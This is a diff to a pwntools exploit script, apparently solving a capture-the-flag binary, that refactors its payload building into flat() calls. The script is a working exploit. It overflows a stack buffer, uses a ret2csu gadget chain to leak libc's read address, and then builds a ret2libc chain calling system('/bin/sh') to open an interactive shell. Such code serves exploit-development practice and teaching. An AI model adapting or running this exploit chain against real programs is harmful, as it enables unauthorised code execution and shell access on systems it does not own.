@@ -49,14 +49,17 @@ csu_pop = 0x00400736
 csu_call = 0x00400720
 
 def ret2csu(got_entry: int, edi: int, rsi: int, rdx: int, rbp: int, return_address: int):
-    ret = p64(0)                # skip first 8 bytes
-    ret += p64(0)              # rbx
-    ret += p64(rbp)            # rbp
-    ret += p64(got_entry)      # r12
-    ret += p64(edi)            # r13
-    ret += p64(rsi)            # r14
-    ret += p64(rdx)            # r15
-    ret += p64(return_address) # ret
+    ret = flat(
+        0,                  # skip first 8 bytes
+        0,                  # rbx
+        rbp,                # rbp
+        got_entry,          # r12
+        edi,                # r13
+        rsi,                # r14
+        rdx,                # r15
+        return_address,     # ret
+    )      
+    
     return ret
 
 # --- end functions ---
@@ -76,9 +79,10 @@ io = start()
 
 padding = b"a"*0x48
 
+# ret2csu: leak libc address
 payload = flat(
     padding,
-    p64(csu_pop),
+    csu_pop,
     ret2csu(exe.got['write'], 1, exe.got['read'], 8, 1, csu_call),
     ret2csu(0, 0, 0, 0, 1, exe.sym['main'])
 )
@@ -88,19 +92,21 @@ io.recvuntil(b"Configuring...\n\n")
 leaked_read = u64(io.recv(8))
 libc.address = leaked_read - libc.sym['read']
 success(f"libc.address: {hex(libc.address)}")
-
 # -----------------
+
+# ret2libc
 poprdi = 0x0000000000400743 #: pop rdi ; ret
 ret = 0x00000000004004de #: ret
 
 payload = flat(
     padding,
-    p64(poprdi),
-    p64(next(libc.search(b'/bin/sh\x00'))),
-    p64(libc.sym['system'])
+    poprdi,
+    next(libc.search(b'/bin/sh\x00')),
+    libc.sym['system']
 )
 
 s(payload)
+# -----------------
 
 io.interactive()
 
